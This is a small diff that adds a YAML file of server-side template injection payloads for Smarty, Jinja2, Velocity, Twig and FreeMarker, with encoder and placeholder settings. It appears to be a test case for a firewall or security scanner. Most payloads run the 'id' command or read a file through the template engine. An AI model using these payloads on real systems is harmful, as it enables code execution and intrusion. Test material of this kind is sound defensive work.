@@ -1,0 +1,12 @@
+payload:
+  - '{php}echo ‘id’;{/php}'
+  - "{{+''.__class__.__mro__[2].__subclasses__()[40]('/test/aaaa').read()+}}"
+  - '${class.getResource("./test/test.res").getContent()}'
+  - '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
+  - '<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}'
+encoder:
+  - Base64Flat
+  - Url
+placeholder:
+  - UrlPath
+  - UrlParam
